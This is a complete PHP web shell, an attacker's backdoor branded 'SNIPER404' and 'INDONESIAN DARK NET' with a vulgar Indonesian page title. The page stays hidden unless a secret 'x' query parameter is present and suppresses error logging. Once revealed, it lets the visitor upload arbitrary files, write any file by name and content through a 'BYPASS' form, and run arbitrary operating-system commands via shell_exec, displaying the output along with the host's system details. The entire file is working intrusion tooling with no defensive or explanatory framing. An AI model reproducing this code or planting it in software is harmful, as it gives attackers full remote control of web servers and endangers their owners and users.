<?php
error_reporting(0);
error_log(0);
if(isset($_GET["x"])){
if( file_exists($_FILES["uploadfile"]["tmp_name"]) )
{
  $filename = $_FILES["uploadfile"]["tmp_name"];
  $fp=@fopen($filename,"r");
  $contents=@fread($fp, filesize($filename));
  @fclose($fp);
    
  $fp = fopen($_FILES["uploadfile"]["name"], "w");
  fputs($fp, $contents);
  fclose($fp);
  
  echo "file ". $_FILES["uploadfile"]["name"] ." Terupload mas :) ";
}
echo "<center>
<h4>HIDDEN AKSES</h4><br><b>".php_uname()."</b><br><br>";
echo'<form enctype="multipart/form-data" method="post">
</script><br>
<b>File : </b> <input name="uploadfile" type="file">
<input type="submit" value="SEND">
</form>';


if (!isset($_POST["submit"])) {
echo "<form method='POST'>
<center>BYPASS <input type='text' name='fname' size=''><br><br /> <textarea cols='30' rows='15' name='fcode'></textarea><br><br /><input type='submit' name='submit' value='BYPASS'> </form></center>";
  
} else { $fname = $_POST["fname"]; $fcode = $_POST["fcode"]; fwrite(fopen($fname, "w"), $fcode); 
}


if (!empty($_POST['cmd'])) {
$cmd = shell_exec($_POST['cmd']);
}
?>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
<title>KONTOL GEDE BANGET</title>
<style>
h2 {
color: rgba(0, 0, 0, .75);
}
pre {
padding: 15px;
-webkit-border-radius: 5px;
-moz-border-radius: 5px;
border-radius: 5px;
background-color: #ECF0F1;
}
.container {
width: 850px;
}
</style>
</head>
<body>
<div class="container">
<div class="pb-2 mt-4 mb-2">
<h1>SNIPER404</h1>
<h2>INDONESIAN DARK NET</h2>
</div>
<form method="POST">
<div class="form-group">
<label for="cmd"><strong>Command</strong></label>
<input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
</div>
<button type="submit" class="btn btn-primary">GASS</button></form>
<?php if ($cmd): ?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
</pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):

?>
<div class="pb-2 mt-4 mb-2">
<h2> Output </h2>
</div>
<pre><small>No result.</small></pre>
<?php endif; ?>
</div>
</body>
</html>
<?php
}
?>
